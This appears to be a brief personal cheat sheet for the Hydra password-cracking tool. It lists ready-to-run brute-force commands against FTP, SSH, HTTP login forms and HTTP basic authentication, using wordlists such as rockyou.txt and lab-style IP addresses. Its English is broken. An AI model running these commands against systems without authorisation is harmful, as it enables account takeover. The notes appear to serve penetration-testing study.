# hydra 

Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. 
This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely

[Ftp](#ftp)

[SSH](#ssh)

[Login Page](#login-page)

[Http Https](#https-http)


## FTP 

    hydra -l asif -P passlist.txt ftp://192.168.0.1 -f

## SSH

    hydra -l user -P passlist.txt ssh://192.168.0.1 -f

## Login Page

 1. Find some information like which type of request like GET/POST, Find which parameter use to login page like login.php, find varible name in username and password and submite button use view-source page, worng enter password what error message show like username and password is incorrect an enter the user name and password list

        hydra 10.10.232.64 -l admin -P passwords.txt http-form-post "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -V
       
 2. Worng password enter and so message username or password invalid so use F opton difine and password is success and show dashbord so use S option 
        

## Https Http

some time see the Webappliction page lock use usename and password and enter this page 

    hydra -l asif -P rockyou.txt -f 1IP  -s PORT http-get 
    hydra -l asif -P rockyou.txt -f 1IP  -s PORT http-get /login.php/
  
